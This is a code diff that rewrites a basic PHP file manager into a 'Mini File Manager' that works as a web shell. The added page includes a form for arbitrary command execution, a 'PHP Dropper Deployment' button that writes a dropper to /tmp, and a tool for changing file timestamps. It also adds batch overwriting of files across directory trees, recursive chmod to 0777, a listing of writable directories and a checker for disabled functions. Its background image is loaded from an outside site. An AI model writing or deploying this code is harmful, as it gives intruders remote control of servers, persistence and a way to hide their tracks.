+        $f = $item['name'];
+        $path = $item['path'];
+        $relPath = urlencode($path);
+        $output .= "<tr><td><a href='?path=" . $relPath . "'>[DIR] " . h($f) . "</a></td><td>" . h($item['perms']) . "</td><td>Directory</td><td>-</td><td>" . ($item['mtime'] ? date("Y-m-d H:i:s", $item['mtime']) : '-') . "</td><td>";
+        if ($path !== $base && $path !== $home && $path !== '/') {
+            $output .= "<a href='?path=" . urlencode($dir) . "&delete=" . urlencode($f) . "' onclick='return confirm(\"Delete directory $f and all its contents?\")'>Delete</a> | ";
+            $output .= "<a href='?path=" . urlencode($dir) . "&rename=" . urlencode($f) . "'>Rename</a> | ";
+            $output .= "<form method='post' style='display:inline;'><input type='hidden' name='item_name' value='" . h($f) . "'><input type='text' name='perm_level' placeholder='0777' size='4' required><button type='submit' name='chmod_item'>Chmod</button></form>";
+        }
+        $output .= "</td></tr>";
+    }
+    foreach ($files as $item) {
+        $f = $item['name'];
+        $path = $item['path'];
+        $relPath = urlencode($path);
+        $dlLink = "?path=" . urlencode($dir) . "&download=" . urlencode($f);
+        $deleteLink = "?path=" . urlencode($dir) . "&delete=" . urlencode($f);
+        $editLink = "?path=" . urlencode($dir) . "&edit=" . urlencode($f);
+        $renameLink = "?path=" . urlencode($dir) . "&rename=" . urlencode($f);
+        $actions = "<a href='" . h($dlLink) . "'>Download</a>";
+        if ($path !== $base && $path !== $home && $path !== '/') {
+            $actions .= " | <a href='" . h($deleteLink) . "' onclick='return confirm(\"Delete $f?\")'>Delete</a>";
+            $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
+            if (in_array($ext, array('txt', 'php', 'html', 'htm', 'css', 'js', 'log'))) {
+                $actions .= " | <a href='" . h($editLink) . "'>Edit</a>";
+            }
+            $actions .= " | <a href='" . h($renameLink) . "'>Rename</a> | ";
+            $actions .= "<form method='post' style='display:inline;'><input type='hidden' name='item_name' value='" . h($f) . "'><input type='text' name='perm_level' placeholder='0644' size='4' required><button type='submit' name='chmod_item'>Chmod</button></form>";
+        }
+        $output .= "<tr><td>[FILE] " . h($f) . "</td><td>" . h($item['perms']) . "</td><td>File</td><td>" . $item['size'] . " bytes</td><td>" . ($item['mtime'] ? date("Y-m-d H:i:s", $item['mtime']) : '-') . "</td><td>$actions</td></tr>";
+    }
+    if (empty($dirs) && empty($files) && $parentPath === $dir) {
+        $output .= "<tr><td colspan='6'>Unable to open directory.</td></tr>";
+    }
+    $output .= "</table>";
+    return $output;
+}
+
+// Main Logic
+$output = renderFileList($dir, $home, $base, $isPhp4);
 ?>
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PHP File Manager</title>
+    <title>Mini File Manager</title>
+    <meta charset="utf-8">
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
-        .container { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .file-list { border: 1px solid #ddd; margin: 10px 0; }
-        .file-item { padding: 10px; border-bottom: 1px solid #eee; }
-        .file-item:hover { background: #f9f9f9; }
-        .dir { color: #0066cc; font-weight: bold; }
-        .file { color: #333; }
-        .btn { padding: 5px 10px; margin: 2px; border: 1px solid #ccc; background: #fff; cursor: pointer; }
-        .btn:hover { background: #e0e0e0; }
-        .editor { width: 100%; height: 400px; font-family: monospace; }
-        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; margin: 10px 0; }
-        .breadcrumb { margin: 10px 0; padding: 10px; background: #e9ecef; border-radius: 3px; }
-        .breadcrumb a { color: #0066cc; text-decoration: none; }
-        .breadcrumb a:hover { text-decoration: underline; }
+        body {
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            background: #0a0a0a url('https://heritageangkortours.com/nyx.png') no-repeat center center fixed;
+            background-size: 700px auto;
+            color: #eee;
+        }
+        h2 {
+            margin-top: 0;
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ffcc;
+            text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
+            background: linear-gradient(45deg, #00ffcc, #00cc99);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            padding: 10px;
+        }
+        h3, h4 {
+            color: #00ffcc;
+        }
+        .msg { padding: 8px; margin: 5px 0; border-radius: 4px; }
+        .success { background: rgba(0, 128, 0, 0.2); border: 1px solid #4caf50; }
+        .error { background: rgba(128, 0, 0, 0.2); border: 1px solid #f44336; }
+        table { border-collapse: collapse; width: 100%; background: rgba(0, 0, 0, 0.6); color: #fff; }
+        th, td { padding: 6px 10px; border: 1px solid #444; }
+        th { background: rgba(255, 255, 255, 0.1); }
+        form { margin: 10px 0; }
+        input[type=text], input[type=file], textarea {
+            background: rgba(0, 0, 0, 0.6);
+            color: #fff;
+            border: 1px solid #555;
+            padding: 6px;
+        }
+        button {
+            padding: 6px 10px;
+            cursor: pointer;
+            background: #111;
+            color: #0f0;
+            border: 1px solid #0f0;
+            border-radius: 4px;
+        }
+        button:hover { background: #0f0; color: #111; }
+        .btn-danger {
+            background: #dc3545;
+            border: 1px solid #dc3545;
+        }
+        .btn-danger:hover {
+            background: #c82333;
+            color: #fff;
+        }
+        textarea { width: 100%; height: 300px; font-family: monospace; }
+        .panel { background: rgba(0, 0, 0, 0.6); padding: 10px; margin-bottom: 10px; border: 1px solid #333; border-radius: 6px; }
+        .small { font-size: 12px; color: #9ee6b7; }
+        .sort-links { margin-bottom: 10px; }
+        .sort-links a { color: #0f0; margin-right: 10px; }
+        .sort-links a:hover { color: #fff; }
+        .breadcrumbs { margin-bottom: 10px; }
+        .breadcrumbs a { color: #0f0; margin-right: 8px; font-weight: bold; text-decoration: none; }
+        .breadcrumbs a:hover { color: #fff; }
+        .breadcrumbs a::before { content: '['; }
+        .breadcrumbs a::after { content: ']'; }
+        .feature-box {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 15px;
+            margin-bottom: 25px;
+            border: 1px solid #333;
+            border-radius: 6px;
+        }
+        pre { background: rgba(0, 0, 0, 0.6); padding: 10px; border: 1px solid #333; overflow: auto; }
+        ul { list-style-type: none; padding: 0; }
+        li { margin-bottom: 5px; }
+        .summary { display: flex; gap: 20px; margin-bottom: 20px; }
+        .summary div { flex: 1; padding: 15px; border-radius: 8px; text-align: center; font-weight: bold; }
+        .total { background: #333; }
+        .enabled { background: #2e7d32; }
+        .disabled { background: #b71c1c; }
+        .ok { color: #4caf50; font-weight: bold; }
+        .bad { color: #f44336; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>PHP File Manager</h1>
-        
-        <div class="warning">
-            <strong>Warning:</strong> This is a powerful file manager. Use with caution!
-        </div>
-
-        <!-- CHMOD Self Form -->
-        <form method="post" style="margin: 10px 0;">
-            <button type="submit" name="chmod_self" class="btn">CHMOD Self to 0777</button>
-            Current permissions: <?php echo substr(sprintf('%o', fileperms(__FILE__)), -4); ?>
-        </form>
-
-        <!-- Breadcrumb Navigation -->
-        <div class="breadcrumb">
-            <strong>Current Path:</strong> 
-            <?php
-            $path_parts = explode('/', str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', $current_dir));
-            $current_path = realpath($_SERVER['DOCUMENT_ROOT']);
-            echo "<a href='?dir=" . urlencode($current_path) . "'>ROOT</a>";
-            
-            foreach ($path_parts as $part) {
-                if (!empty($part)) {
-                    $current_path .= '/' . $part;
-                    echo " / <a href='?dir=" . urlencode($current_path) . "'>$part</a>";
+<h2>Mini File Manager (v<?php echo h($scriptVersion); ?>)</h2>
+<?php if (isset($msg)) echo "<div class='msg success'>" . $msg . "</div>"; ?>
+<div class="panel">
+    <a href="?path=<?php echo urlencode($dir); ?>&update=1"><button>Check for Updates</button></a>
+    <a href="?path=<?php echo urlencode($dir); ?>&check_functions=1"><button>Check Functions</button></a>
+</div>
+<div class="panel breadcrumbs">
+    <?php
+    $current = @realpath($dir);
+    $parts = array();
+    if ($current && @is_dir($current) && @is_readable($current)) {
+        $parts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
+        $linkPath = '';
+        if ($current === DIRECTORY_SEPARATOR) {
+            echo "<a href='?path=" . urlencode('/') . "'>root</a>";
+        } else {
+            echo "<a href='?path=" . urlencode('/') . "'>root</a>";
+            foreach ($parts as $p) {
+                if (!$p) continue;
+                $linkPath .= DIRECTORY_SEPARATOR . $p;
+                $realLinkPath = @realpath($linkPath);
+                if ($realLinkPath && @is_dir($realLinkPath) && @is_readable($realLinkPath)) {
+                    echo " <a href='?path=" . urlencode($realLinkPath) . "'>" . h($p) . "</a>";
                 }
             }
-            ?>
-        </div>
-
-        <!-- Navigation Form -->
-        <form method="post" style="margin: 10px 0;">
-            <input type="text" name="new_dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="width: 500px;">
-            <button type="submit" class="btn">Go to Directory</button>
-        </form>
-
-        <!-- File List -->
-        <h3>Contents of: <?php echo htmlspecialchars($current_dir); ?></h3>
-        <div class="file-list">
-            <!-- Parent Directory Link -->
-            <?php if ($current_dir != realpath($_SERVER['DOCUMENT_ROOT'])): ?>
-                <div class="file-item dir">
-                    <strong>..</strong> [Parent Directory]
-                    <a href="<?php echo $parent_link; ?>" class="btn">Go Up</a>
-                </div>
-            <?php endif; ?>
-
-            <?php
-            $files = listDirectory($current_dir);
-            if (empty($files)) {
-                echo "<div class='file-item'>Directory is empty or doesn't exist.</div>";
-            } else {
-                foreach ($files as $file) {
-                    echo "<div class='file-item " . ($file['is_dir'] ? 'dir' : 'file') . "'>";
-                    echo "<strong>" . htmlspecialchars($file['name']) . "</strong>";
-                    echo " [Size: " . $file['size'] . "]";
-                    echo " [Perms: " . $file['perms'] . "]";
-                    echo " [Modified: " . $file['modified'] . "]";
-                    
-                    if ($file['is_dir']) {
-                        echo " <a href='?dir=" . urlencode($file['path']) . "' class='btn'>Open</a>";
-                    } else {
-                        echo " <a href='?edit=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn'>Edit</a>";
-                        echo " <a href='?delete=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn' onclick='return confirm(\"Delete this file?\")'>Delete</a>";
-                    }
-                    
-                    echo "</div>";
-                }
-            }
-            ?>
-        </div>
-
-        <!-- File Editor -->
-        <?php if (isset($_GET['edit'])): ?>
-            <h3>Editing: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
-            <form method="post">
-                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
-                <textarea name="file_content" class="editor"><?php 
-                    echo htmlspecialchars(file_get_contents($_GET['edit']));
-                ?></textarea>
-                <div style="margin-top: 10px;">
-                    <button type="submit" name="save_file" class="btn">Save File</button>
-                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">Cancel</a>
-                </div>
-            </form>
-        <?php endif; ?>
-
-        <!-- File Upload -->
-        <h3>Upload File</h3>
-        <form method="post" enctype="multipart/form-data">
-            <input type="file" name="upload_file">
-            <button type="submit" name="upload" class="btn">Upload</button>
-        </form>
-
-        <?php
-        // Handle file upload
-        if (isset($_POST['upload']) && isset($_FILES['upload_file'])) {
-            $target_file = $current_dir . '/' . basename($_FILES['upload_file']['name']);
-            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
-                echo "<div style='color: green;'>File uploaded successfully!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($current_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>File upload failed!</div>";
-            }
         }
-
-        // Handle file deletion
-        if (isset($_GET['delete'])) {
-            if (unlink($_GET['delete'])) {
-                echo "<div style='color: green;'>File deleted successfully!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($current_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>Failed to delete file!</div>";
-            }
-        }
-        ?>
+    } else {
+        echo "<div class='msg error'>Warning: Unable to build navigation trail.</div>";
+    }
+    ?>
+</div>
+<div class="sort-links">
+    Sort by: 
+    <a href="?path=<?php echo urlencode($dir); ?>&sort=name">Name</a>
+    <a href="?path=<?php echo urlencode($dir); ?>&sort=size">Size</a>
+    <a href="?path=<?php echo urlencode($dir); ?>&sort=time">Modified</a>
+</div>
+<div class="panel">
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <button type="submit">Upload</button>
+    </form>
+</div>
+<div class="panel">
+    <form method="post">
+        <input type="text" name="newfolder" placeholder="New folder name">
+        <button type="submit">Create Folder</button>
+    </form>
+</div>
+<div class="panel">
+    <form method="post">
+        <input type="text" name="newfile" placeholder="New file name">
+        <button type="submit">Create File</button>
+    </form>
+</div>
+<?php
+if (isset($_GET['rename'])) {
+    $renameRel = basename($isPhp4 ? (isset($HTTP_GET_VARS['rename']) ? $HTTP_GET_VARS['rename'] : '') : (isset($_GET['rename']) ? $_GET['rename'] : ''));
+    $renamePath = $dir . '/' . $renameRel;
+    $realRenamePath = @realpath($renamePath);
+    if ($realRenamePath && $realRenamePath !== $base && $realRenamePath !== $home && $realRenamePath !== '/') {
+        echo "<div class='panel'>";
+        echo "<h3>Rename: " . h($renameRel) . "</h3>";
+        echo "<form method='post' action='?path=" . urlencode($dir) . "&rename=" . urlencode($renameRel) . "'>";
+        echo "<input type='text' name='new_name' placeholder='New name' value='" . h($renameRel) . "'>";
+        echo "<button type='submit'>Rename</button>";
+        echo "</form>";
+        echo "</div>";
+    } else {
+        echo "<div class='panel'><div class='msg error'>Invalid or protected path for renaming.</div></div>";
+    }
+}
+echo $output;
+if (isset($_GET['edit'])) {
+    $editRel = basename($isPhp4 ? (isset($HTTP_GET_VARS['edit']) ? $HTTP_GET_VARS['edit'] : '') : (isset($_GET['edit']) ? $_GET['edit'] : ''));
+    $editFile = $dir . "/" . $editRel;
+    $realEditFile = @realpath($editFile);
+    if ($realEditFile && @is_file($editFile) && @is_readable($editFile)) {
+        $content = safe_get($editFile);
+        if ($content === false) $content = "";
+        echo "<div class='panel'><h3>Editing: " . h($editRel) . "</h3> <form method='post'> <input type='hidden' name='edit_file' value='" . h($editRel) . "'> <textarea name='file_content'>" . h($content) . "</textarea><br><br> <button type='submit'>Save</button> </form></div>";
+    } else {
+        echo "<div class='panel'><div class='msg error'>File not readable for editing or invalid path.</div></div>";
+    }
+}
+?>
+<div class="feature-box">
+    <h3>Time File Changer</h3>
+    <form method="POST">
+        <h4>Target File</h4>
+        <input type="text" name="target_file" placeholder="Filename" required />
+        <h4>New Time (YYYY-MM-DD HH:MM:SS)</h4>
+        <input type="text" name="new_time" placeholder="e.g., 2025-12-31 23:59:59" required />
+        <button type="submit" name="change_time">Change File Time</button>
+    </form>
+</div>
+<div class="feature-box">
+    <h3>PHP Dropper Deployment</h3>
+    <form method="POST">
+        <p>This will create a dropper in /tmp and a simple PHP file to call it.</p>
+        <button type="submit" name="deploy_dropper" class="btn-danger">Deploy Dropper</button>
+    </form>
+</div>
+<div class="feature-box">
+    <h3>Batch File Update</h3>
+    <form method="POST" enctype="multipart/form-data">
+        <h4>Update File Content</h4>
+        <input type="file" name="update_file" required />
+        <h4>Start Directory</h4>
+        <input type="text" name="update_start_dir" value="<?php echo h($dir); ?>" placeholder="Start directory" />
+        <h4>File Extension (optional)</h4>
+        <input type="text" name="update_ext" placeholder="e.g., php, html" />
+        <button type="submit" name="batch_update" class="btn-danger" onclick="return confirm('This will update files with the provided content. Continue?');">Execute Batch Update</button>
+    </form>
+</div>
+<div class="feature-box">
+    <h3>Single File Update</h3>
+    <form method="POST" enctype="multipart/form-data">
+        <h4>Target File</h4>
+        <input type="text" name="target_file" placeholder="Filename in current dir" required />
+        <h4>Update File Content</h4>
+        <input type="file" name="update_file_single" required />
+        <button type="submit" name="file_update" class="btn-danger" onclick="return confirm('This will update the file. Continue?');">Update File</button>
+    </form>
+</div>
+<div class="feature-box">
+    <h3>Recursive Chmod</h3>
+    <form method="POST">
+        <h4>Permission Level</h4>
+        <input type="text" name="perm_level" placeholder="0777" required />
+        <button type="submit" name="chmod_all" class="btn-danger" onclick="return confirm('This will set permissions recursively. Continue?');">Chmod All</button>
+    </form>
+</div>
+<div class="feature-box">
+    <h3>System Information</h3>
+    <table>
+        <?php foreach ($server_info as $key => $value) { ?>
+            <tr>
+                <th><?php echo h(waf_decode($key)); ?></th>
+                <td><?php echo h($value); ?></td>
+            </tr>
+        <?php } ?>
+    </table>
+</div>
+<div class="feature-box">
+    <h3>Writable Directories</h3>
+    <?php if (empty($writable_dirs)) { ?>
+        <p>No writable directories found.</p>
+    <?php } else { ?>
+        <ul>
+            <?php foreach ($writable_dirs as $wdir) { ?>
+                <li><?php echo h($wdir); ?></li>
+            <?php } ?>
+        </ul>
+    <?php } ?>
+</div>
+<div class="feature-box">
+    <h3>Disk Usage</h3>
+    <pre><?php echo h(shell_exec("df -h")); ?></pre>
+</div>
+<div class="feature-box">
+    <h3>File Search</h3>
+    <form method="POST">
+        <input type="text" name="search_term" placeholder="Search Term" required />
+        <button type="submit">Search</button>
+    </form>
+    <?php if (isset($search_results)) { ?>
+        <div class="search-results">
+            <h4>Search Results</h4>
+            <?php if (empty($search_results)) { ?>
+                <p>No files found.</p>
+            <?php } else { ?>
+                <ul>
+                    <?php foreach ($search_results as $result) { ?>
+                        <li><?php echo h($result); ?></li>
+                    <?php } ?>
+                </ul>
+            <?php } ?>
+        </div>
+    <?php } ?>
+</div>
+<div class="feature-box">
+    <h3>CMD Execution</h3>
+    <form method="POST">
+        <input type="text" name="cmd" placeholder="Command (e.g., ls)" required />
+        <button type="submit">Execute</button>
+    </form>
+    <?php if (isset($cmd_output)) { ?>
+        <pre><?php echo h($cmd_output); ?></pre>
+    <?php } ?>
+</div>
+<?php if (isset($_GET['check_functions'])) { ?>
+    <div class="feature-box">
+        <h3>Function Checker</h3>
+        <div class="summary">
+            <div class="total">TOTAL CHECKED<br><?php echo count($functions); ?> functions</div>
+            <div class="disabled">DISABLED<br><?php echo $disabledCount; ?> functions</div>
+            <div class="enabled">ENABLED<br><?php echo $enabledCount; ?> functions</div>
+        </div>
+        <table>
+            <tr><th>Function</th><th>Status</th></tr>
+            <?php foreach ($statusList as $fn => $st) { ?>
+            <tr>
+                <td><?php echo h($fn); ?></td>
+                <td class="<?php echo $st === 'ENABLED' ? 'ok' : 'bad'; ?>">
+                    <?php echo $st; ?>
+                </td>
+            </tr>
+            <?php } ?>
+        </table>
     </div>
+<?php } ?>
+<p class="small">Tip: If saving fails due to permissions, a downloadable copy (.edited.YYYYMMDD_HHMMSS.txt) is created. Directory deletions are recursive; ensure you confirm before deleting.</p>
 </body>
 </html>
